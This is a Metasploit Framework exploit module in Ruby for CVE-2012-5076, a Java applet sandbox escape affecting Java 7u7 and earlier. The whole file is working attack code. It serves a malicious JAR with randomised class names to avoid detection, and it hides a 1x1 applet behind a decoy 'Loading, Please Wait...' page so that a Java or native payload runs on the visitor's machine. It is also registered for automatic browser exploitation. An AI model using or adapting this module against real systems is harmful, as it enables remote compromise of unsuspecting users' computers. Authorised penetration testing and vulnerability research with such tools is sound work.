##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  include Msf::Exploit::Remote::BrowserAutopwn
  autopwn_info({ :javascript => false })

  def initialize( info = {} )

    super( update_info( info,
      'Name'          => 'Java Applet AverageRangeStatisticImpl Remote Code Execution',
      'Description'   => %q{
          This module abuses the AverageRangeStatisticImpl from a Java Applet to run
        arbitrary Java code outside of the sandbox, a different exploit vector than the one
        exploited in the wild in November of 2012. The vulnerability affects Java version
        7u7 and earlier.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Unknown', # Vulnerability discovery at security-explorations
          'juan vazquez' # Metasploit module
        ],
      'References'    =>
        [
          [ 'CVE', '2012-5076' ],
          [ 'OSVDB', '86363' ],
          [ 'BID', '56054' ],
          [ 'URL', 'http://www.oracle.com/technetwork/topics/security/javacpuoct2012-1515924.html' ],
          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2012-5076' ],
          [ 'URL', 'http://www.security-explorations.com/materials/se-2012-01-report.pdf' ]
        ],
      'Platform'      => [ 'java', 'win', 'osx', 'linux' ],
      'Payload'       => { 'Space' => 20480, 'DisableNops' => true },
      'Targets'       =>
        [
          [ 'Generic (Java Payload)',
            {
              'Platform' => ['java'],
              'Arch' => ARCH_JAVA,
            }
          ],
          [ 'Windows x86 (Native Payload)',
            {
              'Platform' => 'win',
              'Arch' => ARCH_X86,
            }
          ],
          [ 'Mac OS X x86 (Native Payload)',
            {
              'Platform' => 'osx',
              'Arch' => ARCH_X86,
            }
          ],
          [ 'Linux x86 (Native Payload)',
            {
              'Platform' => 'linux',
              'Arch' => ARCH_X86,
            }
          ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Oct 16 2012'
    ))
  end


  def setup
    path = File.join(Msf::Config.install_root, "data", "exploits", "cve-2012-5076_2", "Exploit.class")
    @exploit_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }
    path = File.join(Msf::Config.install_root, "data", "exploits", "cve-2012-5076_2", "B.class")
    @loader_class = File.open(path, "rb") {|fd| fd.read(fd.stat.size) }

    @exploit_class_name = rand_text_alpha("Exploit".length)
    @exploit_class.gsub!("Exploit", @exploit_class_name)
    super
  end

  def on_request_uri(cli, request)
    print_status("handling request for #{request.uri}")

    case request.uri
    when /\.jar$/i
      jar = payload.encoded_jar
      jar.add_file("#{@exploit_class_name}.class", @exploit_class)
      jar.add_file("B.class", @loader_class)
      metasploit_str = rand_text_alpha("metasploit".length)
      payload_str = rand_text_alpha("payload".length)
      jar.entries.each { |entry|
        entry.name.gsub!("metasploit", metasploit_str)
        entry.name.gsub!("Payload", payload_str)
        entry.data = entry.data.gsub("metasploit", metasploit_str)
        entry.data = entry.data.gsub("Payload", payload_str)
      }
      jar.build_manifest

      send_response(cli, jar, { 'Content-Type' => "application/octet-stream" })
    when /\/$/
      payload = regenerate_payload(cli)
      if not payload
        print_error("Failed to generate the payload.")
        send_not_found(cli)
        return
      end
      send_response_html(cli, generate_html, { 'Content-Type' => 'text/html' })
    else
      send_redirect(cli, get_resource() + '/', '')
    end

  end

  def generate_html
    html  = %Q|<html><head><title>Loading, Please Wait...</title></head>|
    html += %Q|<body><center><p>Loading, Please Wait...</p></center>|
    html += %Q|<applet archive="#{rand_text_alpha(8)}.jar" code="#{@exploit_class_name}.class" width="1" height="1">|
    html += %Q|</applet></body></html>|
    return html
  end

end
